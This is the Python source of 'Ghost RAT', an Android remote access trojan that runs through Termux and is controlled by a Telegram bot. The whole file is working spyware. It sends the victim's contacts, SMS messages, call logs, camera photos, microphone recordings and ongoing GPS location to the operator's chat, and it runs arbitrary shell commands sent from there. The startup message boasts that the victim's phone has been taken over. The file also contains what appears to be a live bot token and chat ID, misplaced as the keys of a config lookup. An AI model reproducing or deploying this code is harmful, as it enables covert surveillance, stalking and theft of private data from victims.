#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════
#   ██████╗  █████╗ ████████╗
#   ██╔══██╗██╔══██╗╚══██╔══╝
#   ██████╔╝███████║   ██║
#   ██╔══██╗██╔══██║   ██║
#   ██║  ██║██║  ██║   ██║
#   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
#        G H O S T   R A T
#      Credit : XaztanDEV
# ═══════════════════════════════════════════════════════════════

import os, sys, json, time, socket, subprocess, threading, requests
from datetime import datetime

# ─── Load config ───
try:
    from android.storage import app_storage_path
    BASE_DIR = app_storage_path()
except:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

CONFIG_PATH = os.path.join(BASE_DIR, "config.json")

def load_config():
    try:
        with open(CONFIG_PATH) as f:
            return json.load(f)
    except:
        return {"BOT_TOKEN": "ISI", "CHAT_ID": "ISI"}

CFG = load_config()
BOT_TOKEN = CFG["8963220036:AAHmTSS7SpcICts2LA9764vWIp08Ne-OeKA"]
CHAT_ID   = CFG["6890421403"]
API_URL   = f"https://api.telegram.org/bot{BOT_TOKEN}"

INTERVAL_PING   = CFG.get("INTERVAL_PING", 60)
INTERVAL_CHAT   = CFG.get("INTERVAL_CHAT", 300)
INTERVAL_SCREEN = CFG.get("INTERVAL_SCREEN", 120)

# ─── Utilities ───
def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

def tg(endpoint, data=None, files=None, retry=3):
    for i in range(retry):
        try:
            url = f"{API_URL}/{endpoint}"
            r = requests.post(url, data=data, files=files, timeout=20)
            if r.status_code == 200:
                return r.json()
        except:
            time.sleep(2)
    return None

def send_msg(teks):
    return tg("sendMessage", {"chat_id": CHAT_ID, "text": teks, "parse_mode": "Markdown"})

def send_doc(path, caption=""):
    try:
        with open(path, "rb") as f:
            return tg("sendDocument", {"chat_id": CHAT_ID, "caption": caption}, files={"document": f})
    except: return None

def send_photo(path, caption=""):
    try:
        with open(path, "rb") as f:
            return tg("sendPhoto", {"chat_id": CHAT_ID, "caption": caption}, files={"photo": f})
    except: return None

def send_audio(path, caption=""):
    try:
        with open(path, "rb") as f:
            return tg("sendAudio", {"chat_id": CHAT_ID, "caption": caption}, files={"audio": f})
    except: return None

def getprop(key, default="?"):
    try: return subprocess.check_output(f"getprop {key}", shell=True).decode().strip()
    except: return default

# ─── Device Info ───
def get_device_info():
    info = {
        "model":    getprop("ro.product.model"),
        "brand":    getprop("ro.product.brand"),
        "android":  getprop("ro.build.version.release"),
        "hostname": socket.gethostname(),
    }
    try: info["ip_public"] = requests.get("https://api.ipify.org", timeout=5).text
    except: info["ip_public"] = "?"
    try: info["ip_lokal"] = socket.gethostbyname(socket.gethostname())
    except: info["ip_lokal"] = "?"
    return info

# ─── Kamera ───
def snap_camera(cam=0):
    try:
        path = os.path.join(BASE_DIR, f"cam{cam}.jpg")
        subprocess.call(f"termux-camera-photo -c {cam} {path}", shell=True, timeout=15)
        if os.path.exists(path):
            send_photo(path, f"📸 Camera {cam}")
            os.remove(path)
    except: pass

# ─── Mic ───
def record_mic(duration=15):
    try:
        path = os.path.join(BASE_DIR, "mic.mp3")
        subprocess.call(f"termux-microphone-record -d {duration} -f {path}", shell=True, timeout=duration+5)
        if os.path.exists(path):
            send_audio(path, f"🎙️ {duration}s")
            os.remove(path)
    except: pass

# ─── Lokasi ───
def get_location():
    try:
        output = subprocess.check_output("termux-location -p gps -r once", shell=True, timeout=20).decode()
        return json.loads(output)
    except: return None

def send_location():
    loc = get_location()
    if loc and "latitude" in loc:
        lat, lon = loc["latitude"], loc["longitude"]
        tg("sendLocation", {"chat_id": CHAT_ID, "latitude": lat, "longitude": lon})
        send_msg(f"📍 *Lokasi Update*\n`{lat}, {lon}`\n[Google Maps](https://maps.google.com/?q={lat},{lon})")

# ─── Kontak, SMS, Call ───
def dump_contacts():
    try:
        output = subprocess.check_output("termux-contact-list", shell=True, timeout=10).decode()
        contacts = json.loads(output)
        text = "\n".join([f"{c.get('name','?')}: {c.get('number','?')}" for c in contacts[:100]])
        send_msg(f"📞 *CONTACTS ({len(contacts)})*\n```{text}```")
    except: pass

def dump_sms():
    try:
        output = subprocess.check_output("termux-sms-list -l 100", shell=True, timeout=10).decode()
        sms = json.loads(output)
        text = "\n".join([f"{s.get('number','?')}: {s.get('body','?')[:80]}" for s in sms[:50]])
        send_msg(f"✉️ *SMS*\n```{text}```")
    except: pass

def dump_calls():
    try:
        output = subprocess.check_output("termux-call-log -l 100", shell=True, timeout=10).decode()
        calls = json.loads(output)
        text = "\n".join([f"{c.get('number','?')} ({c.get('type','?')})" for c in calls[:50]])
        send_msg(f"📞 *CALL LOG*\n```{text}```")
    except: pass

# ─── Shell ───
def run_shell(cmd):
    try:
        out = subprocess.check_output(cmd, shell=True, timeout=30, stderr=subprocess.STDOUT).decode()
        send_msg(f"💻 *Output:*\n```{out[:3000]}```")
    except Exception as e:
        send_msg(f"❌ Error: `{e}`")

# ─── Command Handler ───
last_update_id = 0

def cek_command():
    global last_update_id
    try:
        r = requests.get(f"{API_URL}/getUpdates", params={
            "offset": last_update_id + 1, "timeout": 10
        }, timeout=15).json()

        for up in r.get("result", []):
            last_update_id = up["update_id"]
            msg = up.get("message", {})
            text = msg.get("text", "")
            if not text: continue
            if str(msg.get("chat", {}).get("id")) != str(CHAT_ID): continue

            cmd = text.strip()

            if cmd == "/info":
                info = get_device_info()
                send_msg(f"📱 *DEVICE INFO*\nModel: `{info['model']}`\nBrand: `{info['brand']}`\nAndroid: `{info['android']}`\nIP: `{info['ip_public']}`\nHostname: `{info['hostname']}`")

            elif cmd == "/contacts": dump_contacts()
            elif cmd == "/sms": dump_sms()
            elif cmd == "/calls": dump_calls()
            elif cmd == "/cam": snap_camera(0)
            elif cmd == "/cam2": snap_camera(1)
            elif cmd == "/loc": send_location()
            elif cmd.startswith("/mic"): record_mic(15)
            elif cmd.startswith("/sh "): run_shell(cmd[4:])
            elif cmd == "/help":
                send_msg("""
🎛️ *GHOST RAT COMMANDS*
_Credit : XaztanDEV_

📱 `/info` — Device info
📞 `/contacts` — Kontak
✉️ `/sms` — SMS
📞 `/calls` — Call log
📸 `/cam` — Kamera depan
📸 `/cam2` — Kamera belakang
🎙️ `/mic` — Rekam 15s
📍 `/loc` — Lokasi GPS
💻 `/sh <cmd>` — Shell
                """)
    except: pass

# ─── Task Threads ───
def task_ping():
    while True:
        try: send_location()
        except: pass
        time.sleep(INTERVAL_PING)

def task_command():
    while True:
        try: cek_command()
        except: pass
        time.sleep(3)

def task_screen():
    while True:
        try: snap_camera(0)
        except: pass
        time.sleep(INTERVAL_SCREEN)

# ─── Main ───
def start():
    log("🚀 GHOST RAT STARTED")
    log("Credit : XaztanDEV")

    send_msg("""
🔥 *GHOST RAT AKTIF!* 🔥
_Credit : XaztanDEV_

HP korban udah dikuasai.
Ketik `/help` buat liat command.
    """)

    threads = [
        threading.Thread(target=task_ping, daemon=True),
        threading.Thread(target=task_command, daemon=True),
        threading.Thread(target=task_screen, daemon=True),
    ]
    for t in threads: t.start()

    while True:
        time.sleep(60)

if __name__ == "__main__":
    start()